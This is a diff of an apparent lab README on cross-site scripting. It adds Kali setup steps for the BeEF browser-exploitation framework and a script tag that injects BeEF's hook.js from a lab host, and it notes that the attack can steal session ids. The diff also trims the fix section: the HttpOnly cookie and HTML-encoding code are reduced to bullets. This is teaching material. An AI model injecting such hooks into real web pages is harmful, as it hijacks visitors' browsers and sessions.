@@ -49,11 +49,16 @@ Note that this attack can also be used to steal session ids!!
 
 How to hook into the BeEF framework?
 ---------------------------------------------------------------------
+https://beefproject.com/
+
+o) BeEF Setup (Kali 2020.2+)
+	$ sudo apt-get update
+	$ sudo apt-get install beef-xss
 
 o) Start the BeEF server (using a Kali VM) -> ifconfig -> 10.0.2.15
 
 o) Inject the following JavaScript code:
-    <script src="http://10.0.2.4:3000/hook.js"></script>
+    <script src="http://10.0.2.15:3000/hook.js"></script>
 
 o) Open the BeEF Panel in a browser:
     http://10.0.2.15:3000/ui/panel
@@ -62,7 +67,7 @@ Note that this is only working if the Web application is using HTTP.
 With HTTPS we run into a Mixed content error => browser will block
 loading mixed active content.
 
-    BeEF Login: beef/beef
+    BeEF Login: beef/feeb
 
     BeEF Commands:
         - Raw JavaScript
@@ -73,22 +78,11 @@ loading mixed active content.
 How to fix these vulnerabilities?
 ---------------------------------------------------------------------
 
-o) Set the cookie flags:
-       Cookie cookie = new Cookie("id",Base64.encodeBase64String("1234567890".getBytes()));
-       cookie.setHttpOnly(true);  //!!!!
-       response.addCookie(cookie);
+i) Set the cookie flags: HttpOnly, Secure
 
+ii) HTTP Encoding for userdata within the HTML page
 
-o) In ControllerServlet.generateUserPage(): 
-   change
-		html.append(username).append(" as ");
-		html.append(role);
-
-   to
-		html.append(HTMLEncoder.encodeForHTML(username)).append(" as ");
-		html.append(HTMLEncoder.encodeForHTML(role));
-
-o) Configure web.xml to use HTTPS:
+iii) Configure web.xml to use HTTPS
 
     <security-constraint>
 		<web-resource-collection>
